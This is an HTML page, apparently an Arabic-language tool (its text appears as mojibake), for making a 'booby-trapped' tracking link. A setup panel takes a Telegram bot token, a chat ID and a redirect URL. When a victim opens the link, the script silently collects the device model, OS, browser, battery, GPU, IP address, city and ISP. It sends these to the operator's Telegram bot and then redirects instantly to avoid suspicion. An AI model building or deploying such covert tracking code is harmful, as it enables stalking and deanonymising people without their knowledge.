<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/0.7.33/ua-parser.min.js"></script>
</head>
<body style="background-color: #fff;"> <div id="adminPanel" style="direction: rtl; font-family: sans-serif; padding: 20px; max-width: 500px; margin: auto; border: 1px solid #ccc; border-radius: 10px; margin-top: 50px;">
    <h2 style="text-align: center;">Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ø°ÙƒÙŠ</h2>
    <input type="text" id="botToken" placeholder="ØªÙˆÙƒÙ† Ø§Ù„Ø¨ÙˆØª (Bot Token)" style="width: 100%; padding: 10px; margin: 5px 0;">
    <input type="text" id="chatId" placeholder="Ø§Ù„Ø£ÙŠØ¯ÙŠ Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ (Chat ID)" style="width: 100%; padding: 10px; margin: 5px 0;">
    <input type="text" id="targetUrl" placeholder="Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ø±Ø§Ø¯ Ø§Ù„ØªÙˆØ¬Ù‡ Ø¥Ù„ÙŠÙ‡ (Ù…Ø«Ù„ https://google.com)" style="width: 100%; padding: 10px; margin: 5px 0;">
    <button onclick="buildLink()" style="width: 100%; padding: 10px; background: #28a745; color: #fff; border: none; cursor: pointer; margin-top: 10px;">Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø·</button>
    <div id="output" style="display:none; margin-top: 20px;">
        <p>Ø§Ù„Ø±Ø§Ø¨Ø· Ø§Ù„Ù…Ù„ØºÙ… (Ù‚Ù… Ø¨Ù†Ø³Ø®Ù‡ ÙˆØ§Ø®ØªØµØ§Ø±Ù‡):</p>
        <textarea id="finalUrl" style="width: 100%; height: 60px;" readonly></textarea>
    </div>
</div>

<script>
    const params = new URLSearchParams(window.location.search);

    // --- Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø£ÙˆÙ„Ù‰: Ø§Ù„ØµÙ…Øª Ø§Ù„Ù…Ø·Ø¨Ù‚ ÙˆØ¥Ø¹Ø§Ø¯Ø© Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ (Ù„Ù„Ø¶Ø­ÙŠØ©) ---
    if (params.has('d')) {
        // Ø¥Ø®ÙØ§Ø¡ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… ÙÙˆØ±Ø§Ù‹ Ø¹Ù† Ø§Ù„Ø¶Ø­ÙŠØ©
        document.getElementById('adminPanel').style.display = 'none';

        try {
            const config = JSON.parse(atob(params.get('d')));
            captureAndRedirect(config);
        } catch (e) {
            // ÙÙŠ Ø­Ø§Ù„ ÙˆØ¬ÙˆØ¯ Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø±Ø§Ø¨Ø·ØŒ Ù†ÙˆØ¬Ù‡Ù‡ Ù„Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø£ØµÙ„ÙŠ ÙÙˆØ±Ø§Ù‹ Ù„Ø¹Ø¯Ù… Ø¥Ø«Ø§Ø±Ø© Ø§Ù„Ø´ÙƒÙˆÙƒ
            window.location.replace("https://www.google.com");
        }
    }

    // --- Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø«Ø§Ù†ÙŠØ©: Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø§Ø­ØªØ±Ø§ÙÙŠ ---
    async function captureAndRedirect(config) {
        const parser = new UAParser();
        const ua = parser.getResult();
        
        // Ø¬Ù„Ø¨ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
        let batteryInfo = "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        try {
            const b = await navigator.getBattery();
            batteryInfo = `${Math.round(b.level * 100)}% (${b.charging ? 'ÙŠØªÙ… Ø§Ù„Ø´Ø­Ù†' : 'Ù„Ø§ ÙŠØªÙ… Ø§Ù„Ø´Ø­Ù†'})`;
        } catch (e) {}

        // Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙˆØ§Ù„Ø´Ø¨ÙƒØ© Ø¹Ø¨Ø± IP
        let net = {};
        try {
            const res = await fetch('https://ipapi.co/json/');
            net = await res.json();
        } catch (e) {}

        // Ø¬Ù„Ø¨ ÙƒØ±Øª Ø§Ù„Ø´Ø§Ø´Ø© Ù„ØªØ­Ø¯ÙŠØ¯ Ø¯Ù‚Ø© Ø§Ù„Ø·Ø±Ø§Ø²
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
        const gpu = gl && debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

        // ØµÙŠØ§ØºØ© Ø§Ù„ØªÙ‚Ø±ÙŠØ± Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©
        const report = `
ğŸ”” **ØªÙ… Ø±ØµØ¯ Ø¯Ø®ÙˆÙ„ Ø¬Ø¯ÙŠØ¯ Ù„Ù„Ø±Ø§Ø¨Ø·!**
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
ğŸ“± **Ù†ÙˆØ¹ Ø§Ù„Ù‡Ø§ØªÙ:** ${ua.device.vendor || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ (ØºØ§Ù„Ø¨Ø§Ù‹ ÙƒÙ…Ø¨ÙŠÙˆØªØ±)'}
ğŸ› ï¸ **Ù…ÙˆØ¯ÙŠÙ„ Ø§Ù„Ø¬Ù‡Ø§Ø²:** ${ua.device.model || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
ğŸ’» **Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„:** ${ua.os.name} ${ua.os.version}
ğŸŒ **Ø§Ù„Ù…ØªØµÙØ­:** ${ua.browser.name} ${ua.browser.version}
ğŸ”‹ **Ø´Ø­Ù† Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:** ${batteryInfo}
ğŸ® **Ù…Ø¹Ø§Ù„Ø¬ Ø§Ù„Ø±Ø³ÙˆÙ…ÙŠØ§Øª:** ${gpu}

ğŸ“ **Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø´Ø¨ÙƒØ© ÙˆØ§Ù„Ù…ÙˆÙ‚Ø¹:**
â€¢ **Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù€ IP:** \`${net.ip || 'Ù…Ø®ÙÙŠ'}\`
â€¢ **Ø§Ù„Ø¯ÙˆÙ„Ø©:** ${net.country_name || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
â€¢ **Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©:** ${net.city || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}
â€¢ **Ø´Ø±ÙƒØ© Ø§Ù„Ø§ØªØµØ§Ù„:** ${net.org || 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ'}

â° **Ø§Ù„ÙˆÙ‚Øª:** ${new Date().toLocaleString('ar-EG')}
â”â”â”â”â”â”â”â”â”â”â”â”â”â”
        `;

        // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù„Ù„Ø¨ÙˆØª (Ø¨Ø¯ÙˆÙ† Ø§Ù†ØªØ¸Ø§Ø± Ø§Ù„Ø§Ø³ØªØ¬Ø§Ø¨Ø© Ù„Ø²ÙŠØ§Ø¯Ø© Ø§Ù„Ø³Ø±Ø¹Ø©)
        fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: config.chat, text: report, parse_mode: 'Markdown' })
        });

        // Ø§Ù„ØªÙˆØ¬ÙŠÙ‡ Ø§Ù„Ù„Ø­Ø¸ÙŠ (Ù‚Ø¨Ù„ Ø£Ù† ÙŠÙ„Ø§Ø­Ø¸ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø£ÙŠ Ø´ÙŠØ¡)
        window.location.replace(config.url);
    }

    // --- Ø§Ù„Ù…Ø±Ø­Ù„Ø© Ø§Ù„Ø«Ø§Ù„Ø«Ø©: Ø¥Ù†Ø´Ø§Ø¡ Ø§Ù„Ø±Ø§Ø¨Ø· (Ù„Ùƒ Ø£Ù†Øª) ---
    function buildLink() {
        const token = document.getElementById('botToken').value;
        const chat = document.getElementById('chatId').value;
        const url = document.getElementById('targetUrl').value;

        if (!token || !chat || !url) return alert("Ø£ÙƒÙ…Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª!");

        const data = { token, chat, url };
        const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
        const finalLink = window.location.origin + window.location.pathname + "?d=" + encoded;

        document.getElementById('finalUrl').value = finalLink;
        document.getElementById('output').style.display = 'block';
    }
</script>
</body>
</html>
